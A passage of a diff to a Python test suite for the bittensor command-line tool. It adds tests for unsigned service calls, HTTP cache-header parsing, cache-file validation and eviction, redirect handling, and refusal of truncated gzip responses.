         always = invoke("service", "call", "--netuid", "1", "--unsigned", "list-jobs")
         assert always.exit_code == 2 and "always signed" in always.output
+        monkeypatch.delenv("BT_WALLET")
+        default = invoke("service", "call", "--netuid", "1", "tier")
+        assert default.exit_code == 0 and "sent unsigned; -w and -H sign it" in default.output
+        assert http_auth.HEADER_SIGNATURE not in cli.sent[-1][2]
 
     def test_list_keeps_each_service_on_one_line(self, cli, monkeypatch):
         from bittensor.cli import context as cli_context
@@ -1592,10 +1919,10 @@ class TestCli:
         assert result.exit_code == 0, result.output
         assert not any(line.lstrip().startswith("9 ") for line in result.output.splitlines())
 
-    def test_an_input_takes_the_specs_spelling_and_stdin(self, cli):
+    def test_an_input_takes_the_specs_spelling(self, cli):
         cli.pages["https://svc.example/api/v1/jobs"] = {}
-        args = ["create-job", "--model", "@-", "--dry_run"]
-        result = runner.invoke(app, ["service", "call", "--netuid", "1", *args], input="m1\n")
+        args = ["create-job", "--model", "m1", "--dry_run"]
+        result = invoke("service", "call", "--netuid", "1", *args)
         assert result.exit_code == 0, result.output
         assert json.loads(cli.sent[-1][3]) == {"model": "m1", "dry_run": True}
         typo = invoke("service", "call", "--netuid", "1", "create-job", "--modle", "m")
@@ -1647,6 +1974,9 @@ class TestDocumentCache:
             ("no-cache, max-age=300", "0"),
             ("max-age=300", "300"),
             ("max-age=abc", "0"),
+            ('extension="x,max-age=300,y"', "0"),
+            ('max-age="300', "0"),
+            ("max-age=300, max-age = 1", "0"),
             ("", "0"),
         ],
     )
@@ -1672,13 +2002,68 @@ class TestDocumentCache:
         client = Client("finney", substrate=chain({ALICE_HOT: DOC_URL}))
         asyncio.run(services.load(client, 1, cache=tmp_path))
         (path,) = tmp_path.iterdir()
-        entry = json.loads(path.read_text())
-        for changed in ({"url": DOC_URL}, {"expires": time.time() + 10**6}, {"content": 1}):
-            path.write_text(json.dumps({**entry, **changed}))
+        header, body = path.read_bytes().split(b"\n", 1)
+        key, expires = header.split(b" ")
+        assert body == web.pages[SPEC_URL].content
+        for invalid in (
+            b"0" * 64 + b" " + expires + b"\n" + body,
+            key + f" {time.time() + 10**6}\n".encode() + body,
+            header + b"\n" + b"not JSON",
+            b"no header",
+        ):
+            path.write_bytes(invalid)
             asyncio.run(services.load(client, 1, cache=tmp_path))
-        path.write_text("not json")
-        asyncio.run(services.load(client, 1, cache=tmp_path))
         assert fetches(web, SPEC_URL) == 5
+
+    def test_relative_urls_follow_each_metadata_redirect(self, web, tmp_path):
+        doc = document(services=[{"type": "openapi", "endpoint": "spec.json"}])
+        doc["payments"][0]["balance"] = "balance"
+        headers = {"cache-control": "max-age=300", "content-type": "application/json"}
+        web.pages[DOC_URL] = Response(
+            200, headers, json.dumps(doc).encode(), "https://docs.example/v1/doc"
+        )
+        web.pages["https://docs.example/v1/spec.json"] = Response(
+            200,
+            headers,
+            json.dumps(spec(servers=[{"url": "./api"}])).encode(),
+            "https://api.example/v2/spec.json",
+        )
+        service = asyncio.run(services.load_url(DOC_URL, cache=tmp_path))
+        assert service.api_url == "https://api.example/v2/api"
+        assert service.balance_url == "https://docs.example/v1/balance"
+        assert not list(tmp_path.iterdir())
+
+    def test_a_truncated_gzip_trailer_is_refused(self, web):
+        fields = {"content-type": "application/json", "content-encoding": "gzip"}
+        web.pages[SPEC_URL] = Response(200, fields, gzip.compress(json.dumps(spec()).encode())[:-1])
+        with pytest.raises(ServiceError, match="not valid gzip"):
+            load()
+
+    def test_the_cache_drops_its_oldest_entries_past_its_size(self, tmp_path, monkeypatch):
+        response = kept(document())
+        monkeypatch.setattr(services, "CACHE_MAX_BYTES", 10 * (len(response.content) + 100))
+        for n in range(100):
+            services._keep(tmp_path, f"https://example.org/{n}", response)
+        sizes = [path.stat().st_size for path in tmp_path.iterdir()]
+        assert sum(sizes) <= services.CACHE_MAX_BYTES and len(sizes) < 100
+        assert services._cached(tmp_path, "https://example.org/99") == response.content
+        assert services._cached(tmp_path, "https://example.org/0") is None
+
+    def test_repeated_cache_headers_are_observed(self):
+        from email.message import Message
+
+        headers = Message()
+        headers["Cache-Control"] = "no-store"
+        headers["Cache-Control"] = "max-age=300"
+        assert services._max_age(services._headers(headers)) == 0
+
+    def test_a_stale_date_consumes_the_freshness_lifetime(self):
+        fields = {"cache-control": "max-age=300", "date": "Tue, 15 Nov 1994 08:12:31 GMT"}
+        assert services._max_age(fields) == 0
+
+    def test_oversized_cache_numbers_are_ignored(self):
+        assert services._max_age({"cache-control": "max-age=" + "9" * 6000}) == 0
+        assert services._max_age({"cache-control": "max-age=300", "age": "9" * 6000}) == 0
 
     def test_a_gzipped_document_is_read(self, web):
         body = gzip.compress(json.dumps(spec()).encode())
